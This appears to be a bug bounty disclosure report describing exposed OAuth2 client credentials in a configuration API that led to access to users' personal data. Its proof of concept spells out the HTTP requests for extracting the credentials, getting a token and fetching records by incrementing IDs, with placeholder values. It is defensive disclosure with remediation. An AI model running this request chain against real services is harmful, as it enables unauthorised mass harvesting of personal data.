# Title: Leveraging OAuth Misconfiguration: Exposed Client Credentials Leading to PII Leak

- **Platform**: YesWeHack
- **Program**: Private Program
- **Severity**: Critical
- **Date**: April 28, 2025
- **Researcher**: Remy (RMSec)
- **Bounty**: N/A

## Summary
Exposed OAuth2 client credentials (clientId and clientSecret) were discovered in a configuration API endpoint. These credentials allowed retrieval of an access token that provided unrestricted access to sensitive user PII including names, emails, phone numbers, and business data. No rate limiting allowed mass data enumeration.

## Technical Details
During a bug bounty engagement, an XHR request to `/api/v1/configuration` returned global configuration settings containing OAuth2 client credentials. The credentials were used with the Client Credentials grant type to obtain an access token from `/auth/oauth2.0/v1/access_token`. The access token provided access to protected API endpoints that returned PII.

## Steps to Reproduce
1. Browse to the target application and proxy traffic through Burp Suite
2. Observe XHR request to `/api/v1/configuration`
3. Extract `clientId` and `clientSecret` from the JSON response
4. Send POST to token endpoint to get access token

## Proof of Concept
```
Step 1 - Discover credentials:
GET /api/v1/configuration HTTP/1.1
Response: {"clientId":"TARGET_CLIENT_ID","clientSecret":"TARGET_CLIENT_SECRET"}

Step 2 - Get access token:
POST /auth/oauth2.0/v1/access_token HTTP/2
Host: TARGET
Content-Type: application/x-www-form-urlencoded

grant_type=client_credentials&client_id=TARGET_CLIENT_ID&client_secret=TARGET_CLIENT_SECRET

Response: {"access_token":"TARGET_ACCESS_TOKEN","token_type":"Bearer","expires_in":3599}

Step 3 - Access PII:
GET /v1/SENSITIVE_ENDPOINT?id=xxxxxx HTTP/1.1
Host: TARGET_API
Authorization: Bearer TARGET_ACCESS_TOKEN
Api-Key: STATIC_API_KEY

Response: { name, email, phone, address, business data }
```

## Impact
Massive PII leak — attacker could enumerate all users by incrementing numeric IDs due to lack of rate limiting. Sensitive business data and personal information of all users exposed.

## Remediation
Remove OAuth2 credentials from client-side configuration responses. Use proper server-side credential storage. Implement rate limiting on PII-accessing endpoints. Use short-lived tokens with restricted scopes.

## References
- https://blog.rmsec.io/posts/leveraging_oauth_misconfiguration_a_practical_bug_bounty_exploitation
